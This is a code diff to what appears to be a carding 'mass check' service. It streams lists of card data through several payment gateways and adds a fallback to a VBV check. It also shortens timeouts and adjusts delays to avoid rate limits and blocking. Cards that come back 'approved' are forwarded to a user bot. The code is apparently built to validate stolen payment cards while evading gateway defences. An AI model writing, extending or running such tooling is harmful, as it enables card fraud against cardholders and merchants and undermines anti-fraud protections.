@@ -387,8 +387,8 @@ def check_card_route():
 import concurrent.futures
 import random
 
-def safe_process_card(gateway_func, card_data, timeout=120):
-    """Run one card check safely in a thread with timeout."""
+def safe_process_card(gateway_func, card_data, timeout=12):
+    """Run one card check safely in a thread with timeout and better error handling."""
     try:
         with concurrent.futures.ThreadPoolExecutor(max_workers=1) as executor:
             future = executor.submit(gateway_func, card_data)
@@ -398,7 +398,17 @@ def safe_process_card(gateway_func, card_data, timeout=120):
             if not isinstance(result, dict):
                 return {
                     "status": "Error",
-                    "response": "Invalid response from gateway",
+                    "response": "Invalid response format from gateway",
+                    "gateway": gateway_func.__name__,
+                }
+            
+            # Check if the response indicates a blocking or timeout
+            response_text = str(result.get("response", "")).lower()
+            if any(blocked_indicator in response_text for blocked_indicator in 
+                  ["timeout", "block", "fail", "error", "invalid", "refused", "denied"]):
+                return {
+                    "status": "Error",
+                    "response": f"Gateway issue: {result.get('response', 'Unknown error')}",
                     "gateway": gateway_func.__name__,
                 }
             
@@ -450,23 +460,32 @@ def mass_check():
 
     def generate():
         processed_count = 0
+        successful_checks = 0
+        
         for i, card_data in enumerate(card_list):
             try:
-                # Pick gateway safely
+                result = None
+                
+                # Try the selected gateway first
                 if gateway == "au":
-                    result = safe_process_card(process_card_au, card_data, timeout=600)
+                    result = safe_process_card(process_card_au, card_data, timeout=10)
                 elif gateway == "chk":
-                    result = safe_process_card(check_card, card_data, timeout=600)
+                    result = safe_process_card(check_card, card_data, timeout=10)
                 elif gateway == "vbv":
-                    result = safe_process_card(check_vbv_card, card_data, timeout=600)
+                    result = safe_process_card(check_vbv_card, card_data, timeout=15)
                 elif gateway == "b3":
-                    result = safe_process_card(process_card_b3, card_data, timeout=600)
+                    result = safe_process_card(process_card_b3, card_data, timeout=10)
                 elif gateway == "svb":
-                    result = safe_process_card(process_card_svb, card_data, timeout=600)
+                    result = safe_process_card(process_card_svb, card_data, timeout=10)
                 elif gateway == "pp":
-                    result = safe_process_card(process_card_pp, card_data, timeout=600)
+                    result = safe_process_card(process_card_pp, card_data, timeout=10)
                 else:
                     result = {"status": "Error", "response": "Invalid gateway", "gateway": "N/A"}
+
+                # If the selected gateway failed, try fallback to VBV
+                if result.get("status") == "Error" and gateway != "vbv":
+                    result = safe_process_card(check_vbv_card, card_data, timeout=15)
+                    result["gateway"] = f"{gateway.upper()}→VBV(Fallback)"
 
                 res_data = {
                     "card": card_data,
@@ -474,6 +493,10 @@ def mass_check():
                     "response": result.get("response", "Unknown error"),
                     "gateway": result.get("gateway", gateway.upper()),
                 }
+
+                # Count successful checks (non-error responses)
+                if result.get("status") != "Error":
+                    successful_checks += 1
 
                 # --- Send approved to user bot ---
                 if res_data["status"].lower() == "approved":
@@ -495,8 +518,13 @@ def mass_check():
                 processed_count += 1
                 yield f"data: {json.dumps(res_data)}\n\n"
 
-                # Add a small delay between requests to avoid rate limiting
-                time.sleep(0.5)
+                # Dynamic delay based on success rate
+                if successful_checks / max(1, processed_count) > 0.7:
+                    # If success rate is high, use shorter delay
+                    time.sleep(0.3)
+                else:
+                    # If many failures, use longer delay to avoid blocking
+                    time.sleep(1.0)
 
             except Exception as e:
                 # Log the error but continue with next card
@@ -507,11 +535,11 @@ def mass_check():
                     "gateway": gateway.upper(),
                 }
                 yield f"data: {json.dumps(error_data)}\n\n"
-                time.sleep(0.5)
+                time.sleep(1.0)  # Longer delay after error
                 continue
 
         # Send completion message
-        yield f"data: {json.dumps({'complete': True, 'processed': processed_count, 'total': card_count})}\n\n"
+        yield f"data: {json.dumps({'complete': True, 'processed': processed_count, 'total': card_count, 'successful': successful_checks})}\n\n"
 
     return Response(stream_with_context(generate()), mimetype="text/event-stream")
     
